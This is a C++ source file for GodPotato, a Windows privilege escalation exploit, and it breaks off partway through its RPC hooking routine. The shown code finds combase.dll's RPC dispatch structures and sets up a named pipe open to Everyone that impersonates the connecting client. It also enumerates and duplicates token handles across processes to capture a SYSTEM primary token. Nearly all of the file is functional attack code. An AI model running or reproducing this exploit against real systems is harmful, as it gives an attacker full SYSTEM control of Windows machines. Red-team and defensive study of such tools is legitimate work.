#include "potato.h"
#include "log.h"

#include <psapi.h>
#include <sddl.h>

#include <cstring>
#include <iostream>
#include <iomanip>
#include <unordered_map>
#include <stdexcept>

#ifdef _MSC_VER
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")
#endif

// ===== File-local helpers =====
namespace
{
using NtQuerySystemInformationFn = LONG (WINAPI*)(ULONG, PVOID, ULONG, PULONG);

constexpr ULONG kSystemExtendedHandleInformation = 0x40;
constexpr LONG kStatusInfoLengthMismatch = static_cast<LONG>(0xC0000004);
constexpr DWORD kTokenElevationAccess = TOKEN_QUERY |
    TOKEN_ASSIGN_PRIMARY |
    TOKEN_DUPLICATE |
    TOKEN_IMPERSONATE |
    TOKEN_ADJUST_PRIVILEGES |
    TOKEN_ADJUST_DEFAULT |
    TOKEN_ADJUST_SESSIONID;

NtQuerySystemInformationFn ResolveNtQuerySystemInformation()
{
    static NtQuerySystemInformationFn fn = nullptr;
    if (!fn)
    {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (ntdll)
        {
#if defined(__GNUC__)
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"
#endif
            fn = reinterpret_cast<NtQuerySystemInformationFn>(
                GetProcAddress(ntdll, "NtQuerySystemInformation"));
#if defined(__GNUC__)
#pragma GCC diagnostic pop
#endif
        }
    }
    return fn;
}

std::vector<int> ComputeOccurrence(const uint8_t* pattern, size_t patternLen)
{
    const int alphabet = 256;
    std::vector<int> table(alphabet, -1);
    for (size_t i = 0; i < patternLen; i++)
    {
        table[pattern[i]] = static_cast<int>(i);
    }
    return table;
}

std::vector<size_t> SundaySearch(const uint8_t* text, size_t textLen, const uint8_t* pattern, size_t patternLen)
{
    std::vector<size_t> matches;
    if (!text || !pattern || patternLen == 0 || textLen < patternLen)
    {
        return matches;
    }

    std::vector<int> table = ComputeOccurrence(pattern, patternLen);
    size_t i = 0;
    while (i <= textLen - patternLen)
    {
        size_t j = 0;
        while (j < patternLen && text[i + j] == pattern[j])
        {
            j++;
        }
        if (j == patternLen)
        {
            matches.push_back(i);
        }
        i += patternLen;
        if (i < textLen)
        {
            int last = table[text[i]];
            if (last < 0)
            {
                i += 1;
            }
            else
            {
                i -= static_cast<size_t>(last);
            }
        }
    }
    return matches;
}

std::wstring ToWide(const char* value)
{
    if (!value)
    {
        return std::wstring();
    }

    int required = MultiByteToWideChar(CP_UTF8, 0, value, -1, nullptr, 0);
    if (required <= 0)
    {
        required = MultiByteToWideChar(CP_ACP, 0, value, -1, nullptr, 0);
    }
    if (required <= 0)
    {
        return std::wstring();
    }

    std::wstring out(static_cast<size_t>(required) - 1, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, value, -1, &out[0], required);
    return out;
}

HANDLE OpenCurrentIdentityToken(DWORD desiredAccess)
{
    HANDLE token = nullptr;
    if (OpenThreadToken(GetCurrentThread(), desiredAccess, TRUE, &token))
    {
        return token;
    }

    DWORD lastError = GetLastError();
    if (lastError == ERROR_NO_TOKEN)
    {
        if (OpenProcessToken(GetCurrentProcess(), desiredAccess, &token))
        {
            return token;
        }
    }

    {
        LOG_ERROR_STREAM << "[!] OpenCurrentIdentityToken failed: " << lastError << std::endl;
    }
    return nullptr;
}
} // namespace

// ===== GodPotatoContext static data =====

// Static member definition.
const GUID GodPotatoContext::orcbRPCGuid =
{
    0x18f70770, 0x8e64, 0x11cf, { 0x9a, 0xf1, 0x00, 0x20, 0xaf, 0x6e, 0x72, 0xf4 }
};
// ===== GodPotatoContext methods =====
GodPotatoContext::GodPotatoContext(const std::string& pipeName)
    : combaseModule(nullptr),
      dispatchTablePtr(0),
      useProtseqFunctionPtr(0),
      useProtseqFunctionParamCount(0xffffff),
      procString(0),
      hCombase(nullptr),
      pipeServerHandle(INVALID_HANDLE_VALUE),
      isStart(false),
      isHook(false),
      pipeName(pipeName),
      systemToken(nullptr)
{
    // 初始化基于提供的管道名称的管道路径
    this->serverPipe = "\\\\.\\pipe\\" + pipeName + "\\pipe\\epmapper";
    this->clientPipe = "ncacn_np:localhost/pipe/" + pipeName + "[\\pipe\\epmapper]";

    initContext();
    
    // 设置当前实例用于静态函数回调
    setCurrentInstance(this);

    if (!combaseModule)
    {
        throw std::runtime_error("No combase module found");
    }
    if (dispatchTable.empty() || procString == 0 || useProtseqFunctionPtr == 0)
    {
        throw std::runtime_error("Cannot find IDL structure");
    }
}

GodPotatoContext::~GodPotatoContext()
{
    restore();
    stop();
}

void GodPotatoContext::initContext()
{
    DWORD needed = 0;
    HMODULE modules[1024] = { 0 };

    {
        LOG_INFO_STREAM << "[*] initContext: scanning for combase.dll" << std::endl;
    }

    if (!EnumProcessModules(GetCurrentProcess(), modules, sizeof(modules), &needed))
    {
        {
            LOG_ERROR_STREAM << "[!] EnumProcessModules failed: " << GetLastError() << std::endl;
        }
        return;
    }

    const int numModules = static_cast<int>(needed / sizeof(HMODULE));
    for (int i = 0; i < numModules; i++)
    {
        char moduleName[MAX_PATH] = { 0 };
        if (!GetModuleFileNameA(modules[i], moduleName, MAX_PATH))
        {
            continue;
        }

        std::string name = moduleName;
        size_t pos = name.find_last_of("\\/");
        if (pos != std::string::npos)
        {
            name = name.substr(pos + 1);
        }

        if (_stricmp(name.c_str(), "combase.dll") != 0)
        {
            continue;
        }

        {
            LOG_INFO_STREAM << "[*] Found combase.dll module: " << moduleName << std::endl;
        }

        combaseModule = modules[i];
        hCombase = modules[i];

        MODULEINFO modInfo = {};
        if (!GetModuleInformation(GetCurrentProcess(), modules[i], &modInfo, sizeof(modInfo)))
        {
            {
                LOG_ERROR_STREAM << "[!] GetModuleInformation failed: " << GetLastError() << std::endl;
            }
            return;
        }

        // Scan combase.dll for RPC_SERVER_INTERFACE.
        uint8_t* baseAddr = reinterpret_cast<uint8_t*>(modInfo.lpBaseOfDll);
        size_t size = modInfo.SizeOfImage;

        uint8_t guidBytes[] = {
            0x70, 0x07, 0xF7, 0x18, 0x64, 0x8E, 0xCF, 0x11,
            0x9A, 0xF1, 0x00, 0x20, 0xAF, 0x6E, 0x72, 0xF4
        };
        const uint32_t ifaceSize = sizeof(RPC_SERVER_INTERFACE_EX);
        {
            LOG_INFO_STREAM << "[*] RPC_SERVER_INTERFACE_EX size: " << ifaceSize << std::endl;
            LOG_INFO_STREAM << "[*] Target GUID bytes: {";
            for (size_t i = 0; i < sizeof(guidBytes); i++)
            {
                LOG_INFO_STREAM << "0x" << std::hex << std::setw(2) << std::setfill('0')
                                << static_cast<int>(guidBytes[i]);
                if (i + 1 < sizeof(guidBytes))
                {
                    LOG_INFO_STREAM << ",";
                }
            }
            LOG_INFO_STREAM << std::dec << "}" << std::endl;
        }

        std::vector<uint8_t> pattern(sizeof(uint32_t) + sizeof(guidBytes));
        std::memcpy(pattern.data(), &ifaceSize, sizeof(uint32_t));
        std::memcpy(pattern.data() + sizeof(uint32_t), guidBytes, sizeof(guidBytes));

        std::vector<size_t> matches = SundaySearch(baseAddr, size, pattern.data(), pattern.size());
        {
            LOG_INFO_STREAM << "[*] Pattern matches found: " << matches.size() << std::endl;
            if (matches.empty())
            {
                LOG_ERROR_STREAM << "[!] No matches for (ifaceSize + GUID). This likely indicates a layout/size mismatch." << std::endl;
            }
        }
        for (size_t idx = 0; idx < matches.size(); idx++)
        {
            size_t offset = matches[idx];
            if (offset + sizeof(RPC_SERVER_INTERFACE_EX) > size)
            {
                continue;
            }

            RPC_SERVER_INTERFACE_EX* rpcInterface =
                reinterpret_cast<RPC_SERVER_INTERFACE_EX*>(baseAddr + offset);

            RPC_DISPATCH_TABLE_EX* dispatchTableObj =
                reinterpret_cast<RPC_DISPATCH_TABLE_EX*>(rpcInterface->DispatchTable);

            MIDL_SERVER_INFO_EX* midlServerInfo =
                reinterpret_cast<MIDL_SERVER_INFO_EX*>(rpcInterface->InterpreterInfo);

            if (dispatchTableObj == nullptr || midlServerInfo == nullptr)
            {
                {
                    LOG_ERROR_STREAM << "[!] Null dispatchTable/midlServerInfo at offset: 0x"
                              << std::hex << offset << std::dec << std::endl;
                }
                continue;
            }

            const uint32_t tableCount = dispatchTableObj->DispatchTableCount;
            if (tableCount == 0 || tableCount > 4096)
            {
                // Guard: avoid huge allocations from corrupted structures.
                {
                    LOG_ERROR_STREAM << "[!] Invalid DispatchTableCount: " << tableCount << std::endl;
                }
                continue;
            }

            dispatchTablePtr = reinterpret_cast<uintptr_t>(midlServerInfo->DispatchTable);
            procString = reinterpret_cast<uintptr_t>(midlServerInfo->ProcString);

            dispatchTable.resize(tableCount);
            fmtStringOffsetTable.resize(tableCount);

            for (uint32_t j = 0; j < tableCount; j++)
            {
                dispatchTable[j] = *reinterpret_cast<uintptr_t*>(
                    dispatchTablePtr + j * sizeof(uintptr_t));
            }

            for (uint32_t j = 0; j < tableCount; j++)
            {
                fmtStringOffsetTable[j] = *reinterpret_cast<int16_t*>(
                    reinterpret_cast<uintptr_t>(midlServerInfo->FmtStringOffset) +
                    j * sizeof(int16_t));
            }

            useProtseqFunctionPtr = dispatchTable[0];
            useProtseqFunctionParamCount = *reinterpret_cast<uint8_t*>(
                procString + fmtStringOffsetTable[0] + 19);

            {
                LOG_INFO_STREAM << "[*] Found IDL structure. DispatchTableCount=" << tableCount
                          << " UseProtseqParamCount=" << useProtseqFunctionParamCount << std::endl;
            }
            break;
        }

        break;
    }

    if (combaseModule == nullptr || dispatchTable.empty() || procString == 0 || useProtseqFunctionPtr == 0)
    {
        LOG_ERROR_STREAM << "[!] initContext incomplete. combase=" << combaseModule
                  << " dispatchCount=" << dispatchTable.size()
                  << " procString=0x" << std::hex << procString
                  << " useProtseqPtr=0x" << useProtseqFunctionPtr << std::dec << std::endl;
    }
}

void GodPotatoContext::ProcessToken::Close()
{
    if (tokenHandle && tokenHandle != INVALID_HANDLE_VALUE)
    {
        CloseHandle(tokenHandle);
        tokenHandle = nullptr;
    }
    if (targetProcessToken && targetProcessToken != INVALID_HANDLE_VALUE)
    {
        CloseHandle(targetProcessToken);
        targetProcessToken = nullptr;
    }
}

std::vector<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX> GodPotatoContext::listSystemHandles()
{
    std::vector<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX> result;
    auto ntQuery = ResolveNtQuerySystemInformation();
    if (!ntQuery)
    {
        {
            LOG_ERROR_STREAM << "[!] NtQuerySystemInformation not available" << std::endl;
        }
        return result;
    }

    ULONG size = 1024 * 1024;
    std::vector<uint8_t> buffer(size);
    ULONG returnLength = 0;
    LONG status = 0;

    while ((status = ntQuery(kSystemExtendedHandleInformation, buffer.data(), size, &returnLength)) == kStatusInfoLengthMismatch)
    {
        size *= 2;
        buffer.resize(size);
    }

    if (status != 0)
    {
        {
            LOG_ERROR_STREAM << "[!] NtQuerySystemInformation failed: 0x" << std::hex << status << std::dec << std::endl;
        }
        return result;
    }

    auto* info = reinterpret_cast<SYSTEM_HANDLE_INFORMATION_EX*>(buffer.data());
    ULONG_PTR count = info->NumberOfHandles;
    result.reserve(static_cast<size_t>(count));
    for (ULONG_PTR i = 0; i < count; i++)
    {
        result.push_back(info->Handles[i]);
    }
    return result;
}

USHORT GodPotatoContext::getTokenObjectTypeIndex()
{
    static USHORT cached = 0;
    static bool initialized = false;
    if (initialized)
    {
        return cached;
    }
    initialized = true;

    HANDLE token = OpenCurrentIdentityToken(TOKEN_QUERY);
    if (!token)
    {
        return cached;
    }

    DWORD pid = GetCurrentProcessId();
    const ULONG_PTR targetHandle = reinterpret_cast<ULONG_PTR>(token);
    auto handles = listSystemHandles();
    for (const auto& entry : handles)
    {
        if (static_cast<DWORD>(entry.UniqueProcessId) == pid &&
            entry.HandleValue == targetHandle)
        {
            cached = entry.ObjectTypeIndex;
            break;
        }
    }
    CloseHandle(token);

    {
        LOG_INFO_STREAM << "[*] cached tokenTypeIndex=" << cached << std::endl;
    }
    return cached;
}

static bool QueryTokenSidString(HANDLE token, std::string& outSid)
{
    DWORD sidLength = 0;
    GetTokenInformation(token, TokenUser, nullptr, 0, &sidLength);
    if (sidLength == 0)
    {
        return false;
    }

    std::vector<BYTE> sidBuffer(sidLength);
    if (!GetTokenInformation(token, TokenUser, sidBuffer.data(), sidLength, &sidLength))
    {
        return false;
    }

    TOKEN_USER* tokenUser = reinterpret_cast<TOKEN_USER*>(sidBuffer.data());
    char* sidString = nullptr;
    if (!ConvertSidToStringSidA(tokenUser->User.Sid, &sidString))
    {
        return false;
    }

    outSid = sidString;
    LocalFree(sidString);
    return true;
}

static bool QueryTokenUserName(HANDLE token, std::string& outName)
{
    DWORD sidLength = 0;
    GetTokenInformation(token, TokenUser, nullptr, 0, &sidLength);
    if (sidLength == 0)
    {
        return false;
    }

    std::vector<BYTE> sidBuffer(sidLength);
    if (!GetTokenInformation(token, TokenUser, sidBuffer.data(), sidLength, &sidLength))
    {
        return false;
    }

    TOKEN_USER* tokenUser = reinterpret_cast<TOKEN_USER*>(sidBuffer.data());
    char name[256] = {};
    char domain[256] = {};
    DWORD nameLen = static_cast<DWORD>(sizeof(name));
    DWORD domainLen = static_cast<DWORD>(sizeof(domain));
    SID_NAME_USE use = SidTypeUnknown;
    if (LookupAccountSidA(nullptr, tokenUser->User.Sid, name, &nameLen, domain, &domainLen, &use))
    {
        outName = std::string(domain) + "\\" + std::string(name);
        return true;
    }
    return false;
}

static SECURITY_IMPERSONATION_LEVEL QueryTokenImpersonationLevel(HANDLE token)
{
    DWORD len = 0;
    GetTokenInformation(token, TokenImpersonationLevel, nullptr, 0, &len);
    if (len == 0)
    {
        return SecurityAnonymous;
    }

    SECURITY_IMPERSONATION_LEVEL level = SecurityAnonymous;
    if (!GetTokenInformation(token, TokenImpersonationLevel, &level, sizeof(level), &len))
    {
        return SecurityAnonymous;
    }
    return level;
}

static SECURITY_IMPERSONATION_LEVEL NormalizeImpersonationLevel(HANDLE token)
{
    SECURITY_IMPERSONATION_LEVEL level = QueryTokenImpersonationLevel(token);
    if (level != SecurityAnonymous)
    {
        return level;
    }

    HANDLE dupToken = nullptr;
    if (DuplicateTokenEx(token, kTokenElevationAccess, nullptr, SecurityDelegation,
                         TokenImpersonation, &dupToken))
    {
        CloseHandle(dupToken);
        return SecurityDelegation;
    }

    if (DuplicateTokenEx(token, kTokenElevationAccess, nullptr, SecurityImpersonation,
                         TokenImpersonation, &dupToken))
    {
        CloseHandle(dupToken);
        return SecurityImpersonation;
    }

    {
        LOG_ERROR_STREAM << "[!] DuplicateTokenEx failed to raise impersonation level: "
                  << GetLastError() << std::endl;
    }
    return level;
}

static DWORD QueryTokenIntegrityLevel(HANDLE token)
{
    DWORD len = 0;
    GetTokenInformation(token, TokenIntegrityLevel, nullptr, 0, &len);
    if (len == 0)
    {
        return 0;
    }

    std::vector<BYTE> buffer(len);
    if (!GetTokenInformation(token, TokenIntegrityLevel, buffer.data(), len, &len))
    {
        return 0;
    }

    auto* tml = reinterpret_cast<TOKEN_MANDATORY_LABEL*>(buffer.data());
    return *GetSidSubAuthority(tml->Label.Sid,
        *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
}

static TOKEN_ELEVATION_TYPE QueryTokenElevationType(HANDLE token)
{
    DWORD len = 0;
    TOKEN_ELEVATION_TYPE type = TokenElevationTypeDefault;
    GetTokenInformation(token, TokenElevationType, &type, sizeof(type), &len);
    return type;
}

static void DumpTokenContext(HANDLE token)
{
    if (!token)
    {
        LOG_ERROR_STREAM << "[!] DumpTokenContext: token is null" << std::endl;
        return;
    }

    std::string sid;
    std::string name;
    QueryTokenSidString(token, sid);
    QueryTokenUserName(token, name);

    SECURITY_IMPERSONATION_LEVEL level = NormalizeImpersonationLevel(token);
    DWORD integrityLevel = QueryTokenIntegrityLevel(token);
    TOKEN_ELEVATION_TYPE elevationType = QueryTokenElevationType(token);
    bool restricted = IsTokenRestricted(token) ? true : false;

    LOG_INFO_STREAM << "[*] Current token context:" << std::endl;
    LOG_INFO_STREAM << "    User: " << (name.empty() ? "<unknown>" : name) << std::endl;
    LOG_INFO_STREAM << "    SID: " << (sid.empty() ? "<unknown>" : sid) << std::endl;
    LOG_INFO_STREAM << "    ImpersonationLevel: " << level << std::endl;
    LOG_INFO_STREAM << "    IntegrityLevel: 0x" << std::hex << integrityLevel << std::dec << std::endl;
    LOG_INFO_STREAM << "    ElevationType: " << elevationType << std::endl;
    LOG_INFO_STREAM << "    IsRestricted: " << (restricted ? "true" : "false") << std::endl;

    DWORD size = 0;
    GetTokenInformation(token, TokenPrivileges, nullptr, 0, &size);
    if (size == 0)
    {
        LOG_INFO_STREAM << "    Privileges: <unavailable>" << std::endl;
        return;
    }

    std::vector<BYTE> buffer(size);
    if (!GetTokenInformation(token, TokenPrivileges, buffer.data(), size, &size))
    {
        LOG_INFO_STREAM << "    Privileges: <GetTokenInformation failed>" << std::endl;
        return;
    }

    auto* privs = reinterpret_cast<TOKEN_PRIVILEGES*>(buffer.data());
    LOG_INFO_STREAM << "    Privileges (enabled):" << std::endl;
    for (DWORD i = 0; i < privs->PrivilegeCount; i++)
    {
        const LUID& luid = privs->Privileges[i].Luid;
        DWORD nameLen = 0;
        LookupPrivilegeNameW(nullptr, const_cast<LUID*>(&luid), nullptr, &nameLen);
        if (nameLen == 0)
        {
            continue;
        }

        std::wstring nameBuf(nameLen, L'\0');
        if (LookupPrivilegeNameW(nullptr, const_cast<LUID*>(&luid), &nameBuf[0], &nameLen))
        {
            nameBuf.resize(nameLen);
            bool enabled = (privs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) == SE_PRIVILEGE_ENABLED;
            LOG_INFO_WSTREAM << L"        " << nameBuf << L" : " << (enabled ? L"enabled" : L"disabled") << std::endl;
        }
    }
}

void GodPotatoContext::putToken(std::vector<ProcessToken>& list, ProcessToken& token)
{
    if (!token.tokenHandle)
    {
        return;
    }

    for (auto& existing : list)
    {
        if (existing.userName == token.userName)
        {
            if (token.impersonationLevel > existing.impersonationLevel ||
                (token.impersonationLevel >= SecurityImpersonation &&
                 token.impersonationLevel > existing.impersonationLevel &&
                 (token.elevationType == TokenElevationTypeFull ||
                  token.integrityLevel > existing.integrityLevel)))
            {
                if (!token.isRestricted)
                {
                    existing.Close();
                    existing = token;
                }
                else
                {
                    token.Close();
                }
            }
            else
            {
                token.Close();
            }
            return;
        }
    }
    list.push_back(token);
}

std::vector<GodPotatoContext::ProcessToken> GodPotatoContext::listProcessTokens(
    int targetPid,
    const ListProcessTokensCallback& callback)
{
    std::vector<ProcessToken> tokens;
    auto handles = listSystemHandles();
    USHORT tokenTypeIndex = getTokenObjectTypeIndex();
    HANDLE localProcessHandle = GetCurrentProcess();
    HANDLE processHandle = nullptr;
    int lastPid = -1;
    size_t openProcessFail = 0;
    size_t openProcessTokenFail = 0;
    size_t duplicateHandleFail = 0;
    size_t filteredByType = 0;
    size_t filteredByAccess = 0;
    std::unordered_map<std::string, size_t> sidCounts;

    {
        LOG_INFO_STREAM << "[*] listProcessTokens: handles=" << handles.size()
                  << " tokenTypeIndex=" << tokenTypeIndex << std::endl;
    }

    for (size_t i = 0; i < handles.size(); i++)
    {
        const auto& entry = handles[i];
        int handleEntryPid = static_cast<int>(entry.UniqueProcessId);

        if (!((targetPid > 0 && handleEntryPid == targetPid) || targetPid <= 0))
        {
            continue;
        }

        if (lastPid != handleEntryPid)
        {
            if (processHandle)
            {
                CloseHandle(processHandle);
                processHandle = nullptr;
            }

            processHandle = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, handleEntryPid);
            if (processHandle)
            {
                HANDLE processToken = nullptr;
                if (OpenProcessToken(processHandle, kTokenElevationAccess, &processToken))
                {
                    ProcessToken token = {};
                    token.tokenHandle = processToken;
                    token.targetProcessToken = nullptr;
                    token.targetProcessId = static_cast<DWORD>(handleEntryPid);
                    QueryTokenSidString(processToken, token.sid);
                    QueryTokenUserName(processToken, token.userName);
                    token.impersonationLevel = NormalizeImpersonationLevel(processToken);
                    token.integrityLevel = QueryTokenIntegrityLevel(processToken);
                    token.elevationType = QueryTokenElevationType(processToken);
                    token.isRestricted = IsTokenRestricted(processToken) ? true : false;
                    if (!token.sid.empty())
                    {
                        sidCounts[token.sid]++;
                    }

                    if (callback)
                    {
                        if (callback(token))
                        {
                            putToken(tokens, token);
                        }
                        else
                        {
                            token.Close();
                            goto end;
                        }
                    }
                    else
                    {
                        putToken(tokens, token);
                    }
                }
                else
                {
                    openProcessTokenFail++;
                    {
                        LOG_ERROR_STREAM << "[!] OpenProcessToken failed pid=" << handleEntryPid
                                  << " error=" << GetLastError() << std::endl;
                    }
                }
            }
            else
            {
                openProcessFail++;
                {
                    LOG_ERROR_STREAM << "[!] OpenProcess failed pid=" << handleEntryPid
                              << " error=" << GetLastError() << std::endl;
                }
            }
            lastPid = handleEntryPid;
        }

        if (!processHandle)
        {
            continue;
        }

        if (entry.ObjectTypeIndex != tokenTypeIndex)
        {
            filteredByType++;
            continue;
        }

        if (entry.GrantedAccess == 0x0012019f)
        {
            filteredByAccess++;
            continue;
        }

        HANDLE dupHandle = nullptr;
        if (DuplicateHandle(processHandle,
                            reinterpret_cast<HANDLE>(entry.HandleValue),
                            localProcessHandle,
                            &dupHandle,
                            GENERIC_EXECUTE | GENERIC_READ | GENERIC_WRITE,
                            FALSE,
                            0))
        {
            ProcessToken token = {};
            token.tokenHandle = dupHandle;
            token.targetProcessToken = reinterpret_cast<HANDLE>(entry.HandleValue);
            token.targetProcessId = static_cast<DWORD>(handleEntryPid);
            QueryTokenSidString(dupHandle, token.sid);
            QueryTokenUserName(dupHandle, token.userName);
            token.impersonationLevel = NormalizeImpersonationLevel(dupHandle);
            token.integrityLevel = QueryTokenIntegrityLevel(dupHandle);
            token.elevationType = QueryTokenElevationType(dupHandle);
            token.isRestricted = IsTokenRestricted(dupHandle) ? true : false;
            if (!token.sid.empty())
            {
                sidCounts[token.sid]++;
            }

            if (callback)
            {
                if (callback(token))
                {
                    putToken(tokens, token);
                }
                else
                {
                    token.Close();
                    goto end;
                }
            }
            else
            {
                putToken(tokens, token);
            }
        }
        else
        {
            duplicateHandleFail++;
            {
                LOG_ERROR_STREAM << "[!] DuplicateHandle failed pid=" << handleEntryPid
                          << " error=" << GetLastError() << std::endl;
            }
        }

        lastPid = handleEntryPid;
    }

end:
    if (processHandle)
    {
        CloseHandle(processHandle);
    }
    {
        LOG_INFO_STREAM << "[*] listProcessTokens summary:"
                  << " openProcessFail=" << openProcessFail
                  << " openProcessTokenFail=" << openProcessTokenFail
                  << " duplicateHandleFail=" << duplicateHandleFail
                  << " filteredByType=" << filteredByType
                  << " filteredByAccess=" << filteredByAccess << std::endl;

        LOG_INFO_STREAM << "[*] listProcessTokens SID counts:" << std::endl;
        for (const auto& kv : sidCounts)
        {
            LOG_INFO_STREAM << "    " << kv.first << " : " << kv.second << std::endl;
        }
    }
    return tokens;
}

bool GodPotatoContext::matchesSystemImpersonationCriteria(HANDLE token)
{
    if (!token)
    {
        {
            LOG_ERROR_STREAM << "[!] Token is null" << std::endl;
        }
        return false;
    }

    std::string sid;
    if (!QueryTokenSidString(token, sid))
    {
        {
            LOG_ERROR_STREAM << "[!] QueryTokenSidString failed" << std::endl;
        }
        return false;
    }

    if (sid != "S-1-5-18")
    {
        {
            LOG_INFO_STREAM << "[*] Token SID mismatch: " << sid << std::endl;
        }
        return false;
    }

    SECURITY_IMPERSONATION_LEVEL level = NormalizeImpersonationLevel(token);
    if (level < SecurityImpersonation)
    {
        {
            LOG_INFO_STREAM << "[*] Token impersonation level too low: " << level << std::endl;
        }
        return false;
    }

    DWORD integrityLevel = QueryTokenIntegrityLevel(token);
    if (integrityLevel < 0x4000)
    {
        {
            LOG_INFO_STREAM << "[*] Token integrity level too low: 0x"
                      << std::hex << integrityLevel << std::dec << std::endl;
        }
        return false;
    }

    {
        LOG_INFO_STREAM << "[*] Token matches SharpToken criteria "
                  << "(SYSTEM + Impersonation + System IL=0x"
                  << std::hex << integrityLevel << std::dec << ")" << std::endl;
    }

    return true;
}

void GodPotatoContext::pipeServer()
{
    SECURITY_ATTRIBUTES sa = {};
    PSECURITY_DESCRIPTOR psd = nullptr;

    {
        LOG_INFO_STREAM << "[*] pipeServer thread started. tid=" << GetCurrentThreadId() << std::endl;
    }

    // Create a security descriptor that allows Everyone access.
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorA(
        "D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &psd, nullptr))
    {
        return;
    }

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = psd;
    sa.bInheritHandle = FALSE;

    pipeServerHandle = CreateNamedPipeA(
        this->serverPipe.c_str(),
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        521,
        0,
        123,
        &sa
    );

    {
        LOG_INFO_STREAM << "[*] CreateNamedPipe " << this->serverPipe << std::endl;
    }

    if (pipeServerHandle != INVALID_HANDLE_VALUE)
    {
        OVERLAPPED ov = {};
        ov.hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
        if (!ov.hEvent)
        {
            LOG_ERROR_STREAM << "[!] CreateEvent failed: " << GetLastError() << std::endl;
            return;
        }

        BOOL isConnected = ConnectNamedPipe(pipeServerHandle, &ov);
        DWORD lastError = isConnected ? ERROR_SUCCESS : GetLastError();
        if (!isConnected && lastError == ERROR_IO_PENDING)
        {
            {
                LOG_INFO_STREAM << "[*] ConnectNamedPipe pending..." << std::endl;
            }
            DWORD waitResult = WaitForSingleObject(ov.hEvent, 10000);
            if (waitResult != WAIT_OBJECT_0)
            {
                LOG_ERROR_STREAM << "[!] ConnectNamedPipe timeout waiting for client" << std::endl;
                CancelIoEx(pipeServerHandle, &ov);
                CloseHandle(ov.hEvent);
                return;
            }
            isConnected = TRUE;
            lastError = ERROR_SUCCESS;
        }

        {
            LOG_INFO_STREAM << "[*] ConnectNamedPipe result=" << isConnected
                      << " lastError=" << lastError << std::endl;
        }
        CloseHandle(ov.hEvent);
        if ((isConnected || GetLastError() == ERROR_PIPE_CONNECTED) && isStart)
        {
            {
                LOG_INFO_STREAM << "[*] Pipe Connected!" << std::endl;
            }

            if (ImpersonateNamedPipeClient(pipeServerHandle))
            {
                {
                    LOG_INFO_STREAM << "[*] ImpersonateNamedPipeClient OK" << std::endl;
                }

                HANDLE currentToken = OpenCurrentIdentityToken(kTokenElevationAccess);
                if (currentToken)
                {
                    {
                        LOG_INFO_STREAM << "[*] OpenCurrentIdentityToken OK" << std::endl;
                    }
                    impersonateSystemToken(currentToken);
                    CloseHandle(currentToken);
                }
                RevertToSelf();
            }
            else
            {
                LOG_ERROR_STREAM << "[!] ImpersonateNamedPipeClient fail error:" << GetLastError() << std::endl;
            }
        }
        else
        {
            LOG_ERROR_STREAM << "[!] ConnectNamedPipe timeout" << std::endl;
        }
    }
    else
    {
        LOG_ERROR_STREAM << "[!] CreateNamedPipe fail error:" << GetLastError() << std::endl;
    }

    if (psd)
    {
        LocalFree(psd);
    }

    if (pipeServerHandle != INVALID_HANDLE_VALUE)
    {
        CloseHandle(pipeServerHandle);
        pipeServerHandle = INVALID_HANDLE_VALUE;
    }
}

void GodPotatoContext::impersonateSystemToken(HANDLE token)
{
    {
        LOG_INFO_STREAM << "[*] Start Search System Token" << std::endl;
    }

    if (!token)
    {
        {
            LOG_ERROR_STREAM << "[!] impersonateSystemToken: token is null" << std::endl;
        }
        return;
    }

    {
        LOG_INFO_STREAM << "[*] DumpTokenContext begin" << std::endl;
    }
    DumpTokenContext(token);
    {
        LOG_INFO_STREAM << "[*] DumpTokenContext end" << std::endl;
    }

    bool isFindSystemToken = false;
    {
        LOG_INFO_STREAM << "[*] Enumerating system tokens..." << std::endl;
    }

    auto tokens = listProcessTokens(-1, [&](ProcessToken& processToken) -> bool {
        {
            LOG_INFO_STREAM << "[*] Candidate Token: PID=" << processToken.targetProcessId
                      << " User=" << processToken.userName
                      << " SID=" << processToken.sid
                      << " ImpersonationLevel=" << processToken.impersonationLevel
                      << " Integrity=0x" << std::hex << processToken.integrityLevel << std::dec
                      << " Restricted=" << (processToken.isRestricted ? "true" : "false")
                      << std::endl;
        }
        if (matchesSystemImpersonationCriteria(processToken.tokenHandle))
        {
            HANDLE finalToken = nullptr;
            if (DuplicateTokenEx(processToken.tokenHandle, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &finalToken))
            {
                if (systemToken != nullptr && systemToken != INVALID_HANDLE_VALUE)
                {
                    CloseHandle(systemToken);
                }
                systemToken = finalToken;
                isFindSystemToken = true;
                {
                    LOG_INFO_STREAM << "[*] PID : " << processToken.targetProcessId
                              << " Token:0x" << std::hex << reinterpret_cast<uintptr_t>(processToken.tokenHandle)
                              << std::dec << " User: " << processToken.userName
                              << " ImpersonationLevel: " << processToken.impersonationLevel << std::endl;
                }
                processToken.Close();
                return false;
            }
            else
            {
                LOG_ERROR_STREAM << "[!] DuplicateTokenEx(process token) failed: " << GetLastError() << std::endl;
            }
        }
        else
        {
            LOG_INFO_STREAM << "[*] Token rejected by criteria" << std::endl;
        }
        processToken.Close();
        return true;
        });

    for (auto& tokenNode : tokens)
    {
        tokenNode.Close();
    }

    {
        LOG_INFO_STREAM << "[*] Find System Token : " << (isFindSystemToken ? "true" : "false") << std::endl;
    }
}

void GodPotatoContext::start()
{
    if (isHook && !isStart)
    {
        pipeServerThread = std::thread(&GodPotatoContext::pipeServer, this);
        isStart = true;
    }
    else
    {
        throw std::runtime_error("IsHook == false");
    }
}

void GodPotatoContext::hookRPC()
{
    DWORD oldProtect = 0;
